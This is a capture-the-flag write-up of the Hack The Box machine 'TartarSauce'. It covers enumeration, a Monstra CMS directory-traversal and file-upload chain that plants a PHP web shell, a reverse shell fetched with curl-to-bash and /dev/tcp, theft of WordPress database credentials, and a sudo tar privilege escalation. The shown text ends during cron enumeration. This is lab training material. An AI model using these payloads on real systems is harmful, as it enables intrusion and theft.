# HTB - TartarSauce

## _ENUMERATION_

### Adding hostname to /etc/hosts
```
# echo 10.10.10.88 tartarsauce tartarsauce.htb >> /etc/hosts
#
```

### NMAP

_nmap_ identifies single open port on the host, running Apache httpd. Additionaly robots.txt file is found containg several lines to prevent webcrawlers from indexing some locations. 

```
# nmap -vv -p- -sC -sV -O tartarsauce -oN tartarsauce.nmap
...
Scanning tartarsauce (10.10.10.88) [65535 ports]
Discovered open port 80/tcp on 10.10.10.88
...
Nmap scan report for tartarsauce (10.10.10.88)
Host is up, received echo-reply ttl 63 (0.049s latency).
Scanned at 2021-11-20 07:34:06 EST for 60s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
...
```

### WFUZZ

Checking entries from _robots.txt_ reveals only _/webservices/monstra-3.0.4/_ existing.
```
# curl -s http://tartarsauce/robots.txt |grep Disallow | sed "s/Disallow: \///" > urls
# wfuzz -c -w ./urls -u http://tartarsauce/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://tartarsauce/FUZZ
Total requests: 5

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000003:   404        9 L      32 W       306 Ch      "webservices/easy-file-uploader/"
000000004:   404        9 L      32 W       301 Ch      "webservices/developmental/"
000000005:   404        9 L      32 W       298 Ch      "webservices/phpmyadmin/"
000000001:   404        9 L      32 W       302 Ch      "webservices/tar/tar/source/"
000000002:   200        97 L     282 W      4336 Ch     "webservices/monstra-3.0.4/"

Total time: 0.125893
Processed Requests: 5
Filtered Requests: 0
Requests/sec.: 39.71607
```

### DIRSEARCH

Fuzzing _/webservices/_ for additional entries finds WordPress installation under _/webservices/wp_.

```
# ~/dirsearch/dirsearch.py -u http://tartarsauce.htb/webservices/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
...
Target: http://tartarsauce.htb/webservices/
[07:54:58] Starting:
...
[07:56:31] 301 -  327B  - /webservices/wp  ->  http://tartarsauce.htb/webservices/wp/
[07:56:32] 200 -    2KB - /webservices/wp/wp-login.php
[07:56:32] 200 -   11KB - /webservices/wp/
Task Completed
```

### WPSCAN

Running _wpscan_ produces lengthy report with no immediate attack vectors.
```
# wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p,t,u -v --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Sat Nov 20 06:36:08 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'

[i] The main theme could not be detected.

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:17 <==========================================================================================================================================================> (1500 / 1500) 100.00% Time: 00:00:17
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-10-01T18:28:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-11-18T14:12:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.2.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:04 <============================================================================================================================================================> (400 / 400) 100.00% Time: 00:00:04
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, straightforward typography is readable on a wide variety of screen sizes, and suitable for multiple languages. We designed it using a mobile-first approach, meaning your content takes center-stage, regardless of whether your visitors arrive by smartphone, tablet, laptop, or desktop computer.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: blog, two-columns, left-sidebar, accessibility-ready, custom-background, custom-colors, custom-header, custom-logo, custom-menu, editor-style, featured-images, microformats, post-formats, rtl-language-support, sticky-post, threaded-comments, translation-ready
 | Text Domain: twentyfifteen
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.9'

[+] twentyseventeen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready
 | Text Domain: twentyseventeen
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.4'

[+] twentysixteen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead with an optional right sidebar that works perfectly for blogs and websites. It has custom color options with beautiful default color schemes, a harmonious fluid grid using a mobile-first approach, and impeccable polish in every detail. Twenty Sixteen will make your WordPress look beautiful everywhere.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: one-column, two-columns, right-sidebar, accessibility-ready, custom-background, custom-colors, custom-header, custom-menu, editor-style, featured-images, flexible-header, microformats, post-formats, rtl-language-support, sticky-post, threaded-comments, translation-ready, blog
 | Text Domain: twentysixteen
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.4'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wpadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov 20 06:36:49 2021
[+] Requests Done: 1921
[+] Cached Requests: 62
[+] Data Sent: 567.969 KB
[+] Data Received: 322.84 KB
[+] Memory used: 234.133 MB
[+] Elapsed time: 00:00:40
```

Saving username _wpadmin_ for later examination.

# _EXPLOITATION_

## shell as _www-data_

Checking _http://tartarsauce.htb/webservices/wp/_ opens up a pretty basic WordPress installation.
![](https://github.com/nikip72/HTB/raw/main/TartarSauce/screenshot1.png)
Trying to bruterforce login as _wpadmin_ at http://tartarsauce.htb/webservices/wp/wp-login.php triggers a bruteforce protection.

Next checking up _Monstra_ site at _http://tartarsauce.htb/webservices/monstra-3.0.4_ opens again what seems to be a default Monstra-3.0.4 installation. 
![](https://github.com/nikip72/HTB/raw/main/TartarSauce/screenshot2.png)
Nonе of the links on the top work, however clicking on _Pages Manager_  (http://tartarsauce.htb/webservices/monstra-3.0.4/admin/index.php?id=pages) pops up a login box.
![](https://github.com/nikip72/HTB/raw/main/TartarSauce/screenshot3.png)
Checking for default credentials logs reveals username _admin_ with password _admin_.
![](https://github.com/nikip72/HTB/raw/main/TartarSauce/screenshot4.png)

Searching for Monstra-3.0.4 vulnerabilities we find quite a lot, a nice list can be found here
> https://stack.watch/product/monstra/

Unfortunaltey all code execution vulnerabilities listed fail (probably, later confirmed) due to directory permissions on the web server, se we are unable to gain code execution via CVE-2020-23219 (edit snipplet), CVE-2021-36548 (edit template), CVE-2020-13978 (edit chunk), CVE-2020-13384 (php7 file upload), or CVE-2018-17418 (mixed case extention).

What works is _CVE-2018-16820_, directory traversal vulnerability that allows arbitrary directory listing. Using that vulneability we are able to confirm contents of _/webservices/_ directory on the server by visiting 
> http://tartarsauce.htb//webservices/monstra-3.0.4/admin/index.php?id=filesmanager&path=uploads/.......//./.......//./.......//./.......//./webservices/././

and _/var/www/html/_ contents
> http://tartarsauce.htb//webservices/monstra-3.0.4/admin/index.php?id=filesmanager&path=uploads/.......//./.......//./.......//./.......//./

Combining _CVE-2020-13384_ and _CVE-2018-16820_ it is possible to upload a file under _/var/www/html/_ directory via the following _BURP_ request
```
POST /webservices/monstra-3.0.4/admin/index.php?id=filesmanager&path=uploads/.......//./.......//./.......//./.......//./ HTTP/1.1
Host: tartarsauce.htb
Content-Length: 544
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://tartarsauce.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryceAmGXkJIT2kquTo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://tartarsauce.htb/webservices/monstra-3.0.4/admin/index.php?id=filesmanager&path=uploads/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=pua2pqnush4t5gcfurnajo3fn5; _ga=GA1.2.1634785825.1637343160; _gid=GA1.2.1520495184.1637343160
Connection: close

------WebKitFormBoundaryceAmGXkJIT2kquTo
Content-Disposition: form-data; name="csrf"

98ad3ec8ed4cf9f3c421d5b1190dcb3c470c4030
------WebKitFormBoundaryceAmGXkJIT2kquTo
Content-Disposition: form-data; name="file"; filename="sh.php7"
Content-Type: application/octet-stream

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

------WebKitFormBoundaryceAmGXkJIT2kquTo
Content-Disposition: form-data; name="upload_file"

Upload
------WebKitFormBoundaryceAmGXkJIT2kquTo--
```

Browsing again to
> http://tartarsauce.htb//webservices/monstra-3.0.4/admin/index.php?id=filesmanager&path=uploads/.......//./.......//./.......//./.......//./webservices/././

We can confirm that the upload was successfull.
![](https://github.com/nikip72/HTB/raw/main/TartarSauce/screenshot5.png)

Accessing newly uploaded PHP script it is now possible to execute commands on the host as _www-data_.
```
# curl -s http://tartarsauce.htb/sh.php7?cmd=id|html2text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking out if _curl_ is installed on the target host. Commands containing special chars and spaces should be _url encoded_
```
# curl -s http://tartarsauce.htb/sh.php7?cmd=whereis%20curl|html2text
curl: /usr/bin/curl /usr/share/man/man1/curl.1.gz
```

Creating script for basic reverse shell
```
# echo /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.45/9876 0>&1' > r.sh
```

Setting up local listener
```
# nc -lvp 9876
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9876
Ncat: Listening on 0.0.0.0:9876
```

Setting up local webserver
```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

And accessing it from the host (_url encoded "curl http://10.10.14.45/r.sh|bash"_)
```
# curl -s http://tartarsauce.htb/sh.php7?cmd=curl%20http%3A%2F%2F10.10.14.45%2Fr.sh%7Cbash|html2text
```
We get a hit on the webserver
```
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.88 - - [20/Nov/2021 08:56:35] "GET /r.sh HTTP/1.1" 200 -
```

And a reverse shell in the listener
```
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9876
Ncat: Listening on 0.0.0.0:9876
Ncat: Connection from 10.10.10.88.
Ncat: Connection from 10.10.10.88:40238.
bash: cannot set terminal process group (1248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TartarSauce:/var/www/html$
```
Gaining some basic information - host is running Ubunto 16.04.4 with 4.15.0 kernel and webserver is running under _www-data_ user.
```
www-data@TartarSauce:/var/www/html$ uname -a; cat /etc/issue; id
uname -a; cat /etc/issue; id
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
Ubuntu 16.04.4 LTS \n \l

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking /etc/passwd and /home for users with shells identifies username _onuma_
```
www-data@TartarSauce:/var/www/html$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
onuma:x:1000:1000:,,,:/home/onuma:/bin/bash
www-data@TartarSauce:/var/www/html$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Feb  9  2018 .
drwxr-xr-x 22 root  root  4096 May  1  2018 ..
drwxrw----  5 onuma onuma 4096 Feb 21  2018 onuma
```

Checking the WordPress installation configuration file reveals MySQL username and password 
```
www-data@TartarSauce:/var/www/html$ cat webservices/wp/wp-config.php|grep DB_
cat webservices/wp/wp-config.php|grep DB_
define('DB_NAME', 'wp');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```
Upgrading the shell with python
```
www-data@TartarSauce:/var/www/html$ python -c 'import pty; pty.spawn("/bin/bash")'
<ww/html$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Trying _su_ and _sudo_ with revealed password - unsuccessfull
```
www-data@TartarSauce:/var/www/html$ sudo su -
sudo su -
[sudo] password for www-data: w0rdpr3$$d@t@b@$3@cc3$$

Sorry, try again.
[sudo] password for www-data: w0rdpr3$$d@t@b@$3@cc3$$

Sorry, try again.
[sudo] password for www-data: w0rdpr3$$d@t@b@$3@cc3$$

sudo: 3 incorrect password attempts
www-data@TartarSauce:/var/www/html$ su -
su -
Password: w0rdpr3$$d@t@b@$3@cc3$$

su: Authentication failure
www-data@TartarSauce:/var/www/html$ su - onuma
su - onuma
Password: w0rdpr3$$d@t@b@$3@cc3$$

su: Authentication failure
www-data@TartarSauce:/var/www/html$
```

MySQL enumeration
```
www-data@TartarSauce:/var/www/html$ mysql -u wpuser -p
mysql -u wpuser -p
Enter password: w0rdpr3$$d@t@b@$3@cc3$$

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 333
Server version: 5.7.22-0ubuntu0.16.04.1 (Ubuntu)
...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp                 |
+--------------------+
2 rows in set (0.00 sec)

mysql> use wp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_gwolle_gb_entries  |
| wp_gwolle_gb_log      |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
14 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 | wpadmin       | wpadmin@test.local |          | 2018-02-09 20:49:26 |                     |           0 | wpadmin      |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
mysql> \q
Bye
```

Revealed hash is _NOT_ crackable using _john_ and _rockyou.txt_ word list.

### shell as _onuma_ and user.txt

Next checking sudo rules
```
www-data@TartarSauce:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

According to GTFObins found here
> https://gtfobins.github.io/gtfobins/tar/

we will be able to escalate privileges to _onuma_  user via tar
> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

in our case via
```
www-data@TartarSauce:/var/www/html$ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

/bin/tar: Removing leading `/' from member names
$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
$
```

and user flag is captured
```
$ cd /home/onuma
$ ls -la
total 40
drwxrw---- 5 onuma onuma 4096 Feb 21  2018 .
drwxr-xr-x 3 root  root  4096 Feb  9  2018 ..
lrwxrwxrwx 1 root  root     9 Feb 17  2018 .bash_history -> /dev/null
-rwxrw---- 1 onuma onuma  220 Feb  9  2018 .bash_logout
-rwxrw---- 1 onuma onuma 3871 Feb 15  2018 .bashrc
drwxrw---- 2 onuma onuma 4096 Feb  9  2018 .cache
-rwxrw---- 1 onuma onuma   52 Feb 17  2018 .mysql_history
drwxrw---- 2 onuma onuma 4096 Feb 17  2018 .nano
-rwxrw---- 1 onuma onuma  655 Feb  9  2018 .profile
drwxrw---- 2 onuma onuma 4096 Feb 15  2018 .ssh
-rwxrw---- 1 onuma onuma    0 Feb  9  2018 .sudo_as_admin_successful
lrwxrwxrwx 1 root  root     9 Feb 17  2018 shadow_bkp -> /dev/null
-r-------- 1 onuma onuma   33 Feb  9  2018 user.txt
$ cat user.txt
b2d6ec454.....
```

### _root_ file system read and root.txt

Cronjob enumeration with _pspy_. 
```
onuma@TartarSauce:/tmp$ wget 10.10.14.45/pspy32
--2021-11-20 10:16:51--  http://10.10.14.45/pspy32
Connecting to 10.10.14.45:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2656352 (2.5M) [application/octet-stream]
Saving to: 'pspy32'

pspy32              100%[===================>]   2.53M  2.22MB/s    in 1.1s

2021-11-20 10:16:52 (2.22 MB/s) - 'pspy32' saved [2656352/2656352]
onuma@TartarSauce:/tmp$ chmod +x pspy32
onuma@TartarSauce:/tmp$ ./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2021/11/20 10:19:41 CMD: UID=0    PID=19516  | cut -d  -f1
2021/11/20 10:19:41 CMD: UID=0    PID=19515  | sha1sum
2021/11/20 10:19:41 CMD: UID=0    PID=19514  |
2021/11/20 10:19:41 CMD: UID=0    PID=19513  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19512  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19511  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19510  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19509  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19508  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19507  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19506  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19505  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19504  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19503  | /lib/systemd/systemd-udevd
2021/11/20 10:19:41 CMD: UID=0    PID=19502  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19521  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19517  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=???  PID=19525  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19527  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19529  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19530  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19531  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19533  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19534  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19535  |
2021/11/20 10:19:41 CMD: UID=0    PID=19537  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19538  |
2021/11/20 10:19:41 CMD: UID=0    PID=19542  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19543  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19544  |
2021/11/20 10:19:41 CMD: UID=0    PID=19546  |
2021/11/20 10:19:41 CMD: UID=0    PID=19548  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19550  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19551  |
2021/11/20 10:19:41 CMD: UID=0    PID=19553  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19555  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19556  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19557  |
2021/11/20 10:19:41 CMD: UID=0    PID=19560  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19562  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19563  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19565  |
2021/11/20 10:19:41 CMD: UID=0    PID=19566  |
2021/11/20 10:19:41 CMD: UID=0    PID=19569  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19570  |
2021/11/20 10:19:41 CMD: UID=0    PID=19572  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19574  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19575  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19576  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19578  |
2021/11/20 10:19:41 CMD: UID=0    PID=19580  |
2021/11/20 10:19:41 CMD: UID=0    PID=19582  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19583  |
2021/11/20 10:19:41 CMD: UID=0    PID=19585  | /usr/bin/printf -
2021/11/20 10:19:41 CMD: UID=0    PID=19586  |
2021/11/20 10:19:41 CMD: UID=0    PID=19589  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19590  |
2021/11/20 10:19:41 CMD: UID=0    PID=19592  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:19:41 CMD: UID=0    PID=19598  | /bin/sleep 30
